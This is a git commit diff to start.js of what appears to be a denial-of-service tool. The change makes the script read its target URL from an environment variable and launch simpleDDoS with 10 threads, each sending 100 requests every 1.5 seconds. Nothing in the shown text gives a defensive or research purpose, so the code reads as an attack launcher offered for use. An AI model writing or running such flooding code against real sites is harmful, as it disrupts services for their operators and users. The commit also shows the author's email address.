6a9d83b6e95aba9bf3510dfdce87c9f5ac777061
molfar-goodman <molfarland@gmail.com>
2022-03-11 14:31:20 +0200

    .

--- start.js
+++ start.js
@@ -5,8 +5,8 @@ let threads = process.env.THREADS || 10
 let requests = process.env.REQUESTS || 100
 let interval = process.env.INTERVAL || 1500
 
-console.log(`Start for ${FACKED_URL}`)
+console.log(`Start for ${process.env.FACKED_URL}`)
 
 
 // Launches 10 threads of sending 100 requests every 1.5s
-simpleDDoS(threads, url, requests, interval)
+simpleDDoS(threads, process.env.FACKED_URL, requests, interval)
